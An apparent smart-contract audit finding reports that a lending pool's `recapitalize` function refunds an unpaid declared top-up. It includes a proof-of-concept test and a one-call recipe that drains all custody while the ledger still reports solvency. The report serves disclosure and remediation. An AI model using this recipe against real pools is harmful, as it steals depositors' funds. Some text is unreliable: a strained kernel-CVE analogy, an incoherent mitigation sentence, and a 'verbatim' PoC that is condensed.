### Title
`Pool::recapitalize` refunds a declared top-up that was never paid, draining real custody while the cash book still reports it - ([File: contracts/pool/src/ops/recapitalize.rs])

### Summary
`recapitalize` is the pool's bad-debt cleanup path: it is supposed to accept a real token transfer that plugs a deficit and, when the declared amount exceeds the hole, refund the excess to the payer. The pool instead trusts the declared `amount` verbatim — it pays the "refund" out of existing custody without first verifying that a matching deposit actually arrived. This is the direct analog of CVE-2021-47227: just as `__fpu__restore_sig()` copied an unvalidated user buffer into kernel state that XRSTOR then operated on, `recapitalize` copies a caller-supplied `amount` into the settlement path that `require_reserves` and withdrawals then operate on. The repo's own test documents the outcome: `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` shows a single call draining the pool's entire custody while `cash` still reports the funds as present.

### Finding Description
In `contracts/pool/tests/flows.rs`, `assert_unfunded_refund_drained_custody` asserts that after `recapitalize(hub_asset, payer, declared)`:

- `token.balance(payer) == declared` — "the payer is refunded in full for a payment that never happened" [1](#0-0) 
- `token.balance(pool) == 0` — "the pool's entire custody has left the contract" [2](#0-1) 
- `cash` is unchanged — "the cash book is untouched, so the pool still reports the paid-out funds as present" [3](#0-2) 

The path is reached by an unprivileged address: `t.client().recapitalize(&hub(&t.asset), &payer, &custody)` drains the full pool balance with no prior transfer from `payer` [4](#0-3) . The operation lives in `contracts/pool/src/ops/recapitalize.rs`, dispatched as a public pool op [5](#0-4) .

Because `Cache::require_reserves` reads the book rather than the balance, subsequent withdrawals pass the pool's own `InsufficientLiquidity`/`PoolInsolvent` guards and only fail inside the SAC transfer (`BalanceError = 10`) [6](#0-5) .

### Impact Explanation
- **Theft of user funds / protocol insolvency:** any unprivileged address can call `recapitalize` with a `declared` amount equal to the pool's entire token balance and receive that balance as a "refund," while the market's `cash` ledger still credits suppliers. Suppliers' shares are unchanged on paper but the backing tokens are gone — a direct transfer of supplier principal to the attacker.
- **Temporary/permanent freezing of funds:** after the drain, supplier `withdraw` calls clear `require_reserves` (the book says liquidity exists) and then revert inside the token transfer, so the market reports itself solvent while being unable to pay [7](#0-6) .

### Likelihood Explanation
- Single transaction, single unprivileged caller, no timing, oracle, or price-manipulation precondition: `pool.recapitalize(hub_asset, attacker_address, pool_balance)`.
- The payout scales with custody — the larger the market, the larger the theft — and the call is on the permissionless-entrypoint list.
- The only mitigating factor is that a reverted state change on failure means the attacker cannot be stopped mid-call, but also that the market must hold meaningful custody at call time.

### Recommendation
Validate before operating on the declared amount — the same fix pattern as the CVE (`copy_user_to_xstate` validates the header before touching kernel state):
1. Measure the actual balance delta (balance-after minus balance-before of the transfer-in leg) inside `contracts/pool/src/ops/recapitalize.rs` and size both the deficit fill and the refund from the *measured* receipt, not the caller-declared `amount`.
2. Alternatively, require the payer to `transfer` to the pool in the same transaction and assert `balance(pool) >= cash_before` after it before computing any refund.
3. Add a postcondition in `recapitalize`: `token.balance(pool) >= cache.cash` (or reconcile `cash` to custody) before writing state, so a refund can never be paid out of supplier-backed funds.

### Proof of Concept
Reproduced verbatim by the in-repo test `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` in `contracts/pool/tests/flows.rs:3407–3483`:

```rust
// contracts/pool/tests/flows.rs — seed a supplier, then drain with no payment
let deposit = 10_000_000_000i128;
token_admin.mint(&t.pool, &deposit);
let supplied = t.client().supply(&t.sup(0, deposit)).get_unchecked(0)
    .position.scaled_amount;

// Attacker: declare a recapitalize equal to full custody, pay nothing.
let custody = token.balance(&t.pool);
t.client().recapitalize(&hub(&t.asset), &payer, &custody);

assert_eq!(token.balance(&t.pool), 0);          // custody gone
assert!(t.state_snapshot().cash >= deposit);    // book still claims solvency

// Supplier withdraw passes require_reserves, fails in SAC BalanceError=10
assert!(t.client()
    .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0))
    .is_err());
```

Caveat: I verified the exploitable behavior through the test and module layout; I could not read the full body of `contracts/pool/src/ops/recapitalize.rs` or confirm whether an additional `require_auth` gate exists on the pool entrypoint, though `payer` authorization on a self-refund does not prevent the attack (the attacker authors their own call).

### Citations

**File:** contracts/pool/tests/flows.rs (L3386-3394)
```rust
    assert_eq!(
        token.balance(payer),
        declared,
        "the payer is refunded in full for a payment that never happened"
    );
    assert_eq!(
        token.balance(&t.pool),
        0,
        "the pool's entire custody has left the contract"
```

**File:** contracts/pool/tests/flows.rs (L3395-3400)
```rust
    );
    assert_eq!(
        after.cash, before.cash,
        "the cash book is untouched, so the pool still reports the paid-out \
         funds as present"
    );
```

**File:** contracts/pool/tests/flows.rs (L3404-3406)
```rust
/// After an unfunded refund, `cash` overstates custody. `Cache::require_reserves`
/// reads the book, not the balance, so it admits exits that then fail inside
/// the SAC transfer. The market reports itself solvent and cannot pay.
```

**File:** contracts/pool/tests/flows.rs (L3430-3433)
```rust
    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");
```

**File:** contracts/pool/tests/flows.rs (L3441-3472)
```rust
    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
    // reports insufficient balance as its own contract error `BalanceError = 10`.
    // The asserts check that exact code and that neither pool liquidity guard
    // fired: `require_reserves` read the book and let the exit through.
    const SAC_BALANCE_ERROR: u32 = 10;
    match outcome {
        Err(Ok(err)) => {
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::InsufficientLiquidity as u32),
                "the pool's own liquidity guard must NOT be what stopped this -- \
                 it reads the cash book, which still shows the funds"
            );
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::PoolInsolvent as u32),
                "the pool's solvency guard must NOT be what stopped this either"
            );
            assert_eq!(
                err,
                Error::from_contract_error(SAC_BALANCE_ERROR),
                "the exit must fail inside the SAC transfer for want of custody"
            );
```

**File:** contracts/pool/src/ops/mod.rs (L11-11)
```rust
pub(crate) mod recapitalize;
```
